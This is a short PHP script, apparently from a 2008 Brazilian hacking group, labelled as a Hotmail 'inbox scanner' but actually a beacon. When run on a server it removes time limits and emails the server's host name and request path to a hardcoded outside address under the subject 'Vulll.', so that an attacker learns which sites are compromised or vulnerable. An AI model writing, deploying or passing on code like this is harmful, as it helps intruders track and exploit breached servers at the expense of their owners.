<?php
//=================================
//
//    Scan inb0x hotmail v1.0
//
//  coded by _[[NetWok]]_
//      n?o ippem fdps :]
//
//
//      Elite Goup Forever2008
//=================================
//
ini_set("max_execution_time",-1);
set_time_limit(0);
$use = @get_current_user();
$email = "$use";
$assunto = "Vulll.";
$email1 = "feliipe.bruno@hotmail.com.";
$heades  = "From: <$email>rn";
if(mail($email1, $assunto, $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], $heades)){
echo "Opa, enviado!";
exit();
}
else{
echo "N?o enviei..";
exit();
}
?>

